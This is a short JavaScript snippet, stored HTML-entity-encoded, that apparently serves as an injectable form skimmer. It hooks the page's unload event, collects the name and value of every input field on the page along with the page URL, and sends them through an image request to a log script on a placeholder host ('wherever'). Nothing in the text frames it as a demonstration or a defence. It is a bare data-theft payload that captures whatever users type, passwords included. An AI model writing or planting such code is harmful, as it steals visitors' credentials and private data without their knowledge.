document.getElementsByTagName(&#34;body&#34;)[0].setAttribute(&#34;onunload&#34;,&#34;postData()&#34;);

function postData() {	
                        
        var output = &#34;page=&#34;+document.location;
        var inputs, index;

        inputs = document.getElementsByTagName(&#39;input&#39;);		
        for (index = 0; index &lt; inputs.length; ++index) {
                input_name = inputs[index].id || inputs[index].name;
                output = output + &#34;&amp;&#34; + input_name + &#34;=&#34; + inputs[index].value;
        }
        
        output = encodeURI(output);
        
        console.log(output);
        
        new Image().src = &#34;http://wherever/log.php?&#34;+output;

}

